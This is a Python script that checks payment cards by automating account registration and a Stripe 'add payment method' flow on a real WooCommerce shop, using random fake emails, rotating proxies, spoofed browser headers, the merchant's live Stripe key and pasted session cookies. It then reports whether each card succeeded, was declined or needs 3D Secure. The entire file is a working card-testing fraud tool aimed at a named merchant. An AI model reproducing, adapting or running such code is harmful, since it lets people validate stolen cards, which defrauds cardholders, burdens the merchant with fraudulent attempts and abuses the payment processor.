import requests,random,string
from datetime import datetime
from proxy import proxies
def generate_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5,20)))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com', 'icloud.com'])
    return f'{username}@{domain}'

def getstr(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None
    
def generate_boundary():
    return 'WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
async def stripe_auth3(cc,mm,yy, cvv):

    web = generate_boundary()
    r = requests.session()
    r.proxies = proxies()
    email = generate_email()
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',}
    try:
        response = r.get('https://beautypoetry.co.uk/my-account/', headers=headers)
        reg_nonce = getstr(response.text, 'woocommerce-register-nonce" value="', '"')
    except:
        return '[Stripe_Api] => Error: 1st req.'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F; mailchimp.cart.current_email=riverjk@ceeasy.club; mailchimp.cart.previous_email=riverjk@ceeasy.club',
        'origin': 'https://beautypoetry.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://beautypoetry.co.uk/my-account/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = {
        'email': email,
        'mailchimp_woocommerce_newsletter': '1',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_session_entry': 'https://beautypoetry.co.uk/my-account/',
        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': reg_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    response = r.post('https://beautypoetry.co.uk/my-account/', headers=headers, data=data)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=riverjk@ceeasy.club; mailchimp.cart.previous_email=riverjk@ceeasy.club; _lscache_vary=f35958944ab3bd6971959eaefba3c79a; wordpress_logged_in_3eaddb9923cda9ad8b91c32484fc75fe=riverjk%7C1731436921%7CgqLpqKseRBTcijfTvKcxnrpqsIpJm5A15EDnbsH5CaM%7Cb24405febe322c24c325833a6ba2411808767ee987e608ac38dcad74666c71de; mailchimp_user_email=riverjk%40ceeasy.club; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2Fpayment-methods%2F',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://beautypoetry.co.uk/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }
    try:
        response = r.get('https://beautypoetry.co.uk/my-account/add-payment-method/', headers=headers)
        create_set = getstr(response.text, '"createSetupIntentNonce":"', '"').strip()
    except:
        return '[Stripe_Api] => Error: 2nd req.'

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = {
        'billing_details[name]': 'River',
        'billing_details[email]': email,
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/0f4091ba29; stripe-js-v3/0f4091ba29; payment-element; deferred-intent',
        'referrer': 'https://beautypoetry.co.uk',
        'client_attribution_metadata[client_session_id]': '66e8fcf4-4fd3-4735-a54f-8d5a5c159a2f',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'a3b0ef5c-15fa-46a9-bda4-16cdd3608e2b98ead9',
        'muid': '6eee87fe-b4b5-48a8-bef4-34ce96a308639c951f',
        'sid': 'cef35c54-24fc-4173-ad3c-ee44018810136b41eb',
        'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
        '_stripe_account': 'acct_1OVAeVCO9ZmrtbYr',
    }
    try:
        response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        id = response.json()['id']
    except:
        return '[Stripe_Api] => Error: getting pm.'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': f'multipart/form-data; boundary=----{web}',
        # 'cookie': 'wordpress_sec_3eaddb9923cda9ad8b91c32484fc75fe=riverjk%7C1731436921%7CgqLpqKseRBTcijfTvKcxnrpqsIpJm5A15EDnbsH5CaM%7C1aa8231bfe665c34b843ee5418132e523d0340532645143a0ef5359837c7f83e; mailchimp_landing_site=https%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-29%2019%3A11%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Safari%2F537.36; mailchimp.cart.current_email=riverjk@ceeasy.club; mailchimp.cart.previous_email=riverjk@ceeasy.club; _lscache_vary=f35958944ab3bd6971959eaefba3c79a; wordpress_logged_in_3eaddb9923cda9ad8b91c32484fc75fe=riverjk%7C1731436921%7CgqLpqKseRBTcijfTvKcxnrpqsIpJm5A15EDnbsH5CaM%7Cb24405febe322c24c325833a6ba2411808767ee987e608ac38dcad74666c71de; mailchimp_user_email=riverjk%40ceeasy.club; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fbeautypoetry.co.uk%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=6eee87fe-b4b5-48a8-bef4-34ce96a308639c951f; __stripe_sid=cef35c54-24fc-4173-ad3c-ee44018810136b41eb',
        'origin': 'https://beautypoetry.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://beautypoetry.co.uk/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    data = f'''
------{web}
Content-Disposition: form-data; name="action"

create_setup_intent
------{web}
Content-Disposition: form-data; name="wcpay-payment-method"

{id}
------{web}
Content-Disposition: form-data; name="_ajax_nonce"

{create_set}
------{web}--'''
    try:
        response = r.post('https://beautypoetry.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
        if response.status_code == 200 and '"success":true' in response.text:
            return 'Succeeded'
        elif response.status_code == 400 or '"success":false' in response.text:
            msg = getstr(response.text, '"message":"Error: ', '"')
            return msg
        elif 'required_action' in response.text:
            msg = '3D Secure Required'
            return msg
        else:
            return 'Failed'
    except:
        return '[Stripe_Api] => Error: last req.'